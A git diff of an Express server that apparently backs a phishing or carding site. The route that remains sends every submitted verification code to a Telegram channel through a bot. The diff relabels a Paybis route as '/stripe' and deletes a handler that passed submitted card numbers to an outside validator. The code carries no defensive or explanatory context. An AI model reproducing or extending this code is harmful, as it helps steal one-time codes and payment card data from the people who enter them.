@@ -35,25 +35,15 @@ app.get('/', (req, res) => {
     res.send('Hello World!');
 });
 app.use('/public', express.static(path.join(__dirname, '../public')));
-app.use('/paybis', require('./api/paybis.js'));
+app.use('/stripe', require('./api/paybis.js'));
 
-app.post('/verifyCode',async(req,res)=>{
+app.post('/verify-code',async(req,res)=>{
     try{
         const {code} = req.body;
         await bot.sendMessage('@developers_00', `<b>URL:</b> <code>${11}</code>\n<b>Code:</b> <span class="tg-spoiler">${code}</span>`, { parse_mode: 'HTML' });
         return res.send({success: true, message:'success'})
     }catch{
         return res.send({success: false, message:'error'})
-    }
-})
-
-app.post('/getCardData',async(req,res) => {
-    try{
-        const {cardValue} = req.body;
-        const response = await axios.get(`https://dnschecker.org/ajax_files/credit_card_validator.php?ccn=${cardValue}`)
-        return res.send({success:response?.data ? true : false, message:response?.data || false});
-    }catch{
-        return res.send({success: false, message:'error'});
     }
 })
 
